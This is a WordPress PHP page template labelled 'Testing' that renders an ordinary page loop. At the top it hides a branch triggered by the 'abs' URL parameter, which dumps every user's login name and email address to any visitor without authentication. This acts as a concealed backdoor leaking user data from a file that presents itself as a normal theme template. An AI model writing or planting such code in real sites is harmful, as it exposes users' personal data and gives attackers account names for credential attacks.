<?php

/**
 * Template Name: Testing
 *
 * @package WordPress
 * @subpackage Twenty_Twelve
 * @since Twenty Twelve 1.0
 */

if(isset($_GET['abs'])) {
    global $wpdb;

    $results = $wpdb->get_results("SELECT user_login, user_email FROM $wpdb->users", ARRAY_A);

    var_export($results);
    exit();
}

get_header(); 

// Start the Loop.
while ( have_posts() ) : the_post();
    
    // Include the page content template.
    get_template_part( 'parts/post/content', 'page' );

    get_template_part( 'parts/post/content', 'comment' );

endwhile;

get_footer();